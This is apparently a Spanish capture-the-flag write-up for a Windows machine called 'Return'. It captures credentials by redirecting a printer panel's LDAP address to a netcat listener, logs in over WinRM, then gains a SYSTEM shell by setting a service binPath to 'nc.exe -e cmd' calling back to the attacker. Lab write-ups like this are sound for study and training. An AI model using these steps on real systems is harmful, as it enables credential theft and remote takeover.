---
title: "Return"
description: "Return"
pubDate: 2025-05-20
---

https://www.youtube.com/watch?v=5QC5lshrDDo

# Fase de reconocimiento

Windows
Puertos abiertos:
80
445 SMB
5985 WinRemoteManagament

## SMB

````
crackmapexec smb <ip>
````

Listar recursos compartidos

````
smbclient -L <ip> -N
````

# Fase de ataque

## Web

En la web encontramos una administración de impresora
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240512185134.png)
Cambiamos la address por una nuestra
Nos ponemos en escucha

````
nc -nlvp 389
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240512185232.png)
Nos reporta el usuario y contraseña
Comprobamos que sean validos:

````
crackmapexec smb <ip> -u '<user>' -p '<passwd>'
````

Comprobamos que este en el grupo de winrm para conectarse

````
crackmapexec winrm <ip> -u '<user>' -p '<passwd>'
````

Nos conectamos

````
evil-winrm -i <ip> -u '<user>' -p '<passwd>'
````

\[-\] ==pwned!==

# Privilege Escalation

Ver privilegios

````
whoami /priv
````

Ver en que grupo estamos

````
net user <user>
````

Podemos correr y parar servicios

````
services
````

## Modificar servicio

1. Nos copiamos el nc.exe a la maquina victima

````
uplaod <ruta nc.exe>
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240512190603.png)
2. Modificamos el servicio

````
sc.exe config <nombre> binPath="<ruta nc.exe> -e cmd <ipa> 443"
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240512190905.png)
3. Nos ponemos en escucha

````
nc -nlvp 443
````

4. Paramos y arrancamos el servico

````
sc.exe stop <nombre>
````

````
sc.exe start <nombre>
````

\[+\] ==pwned!==
